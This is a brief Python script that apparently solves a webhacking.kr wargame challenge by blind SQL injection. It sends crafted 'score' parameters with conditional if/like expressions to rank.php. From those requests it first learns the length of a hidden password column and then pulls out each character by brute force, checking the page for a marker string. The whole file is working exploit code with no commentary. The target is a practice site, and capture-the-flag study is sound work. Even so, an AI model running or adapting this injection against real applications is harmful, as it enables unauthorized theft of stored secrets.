from requests import *
s=session()
key='jandi'
leng=0
count=0
for i in range(50):
    url=f'https://webhacking.kr/challenge/web-31/rank.php?score=if(length(p4ssw0rd_1123581321)like({i}),2,1)'
    r=s.get(url=url)
    if r.text.find(key) != -1:
        print("flag length :",i)
        leng=i
        break
print("flag : ",end='')
for i in range(1,leng+1):
    if count >110:
        print('query error')
        break
    for j in range(21,128):
        url=f'https://webhacking.kr/challenge/web-31/rank.php?score=if((ord(right(left(p4ssw0rd_1123581321,{i}),1)))like({j}),2,1)'
        r=s.get(url=url)
        count+=1
        if r.text.find(key) != -1:
            print(chr(j),end='')
            count=0
            break
print('\n')

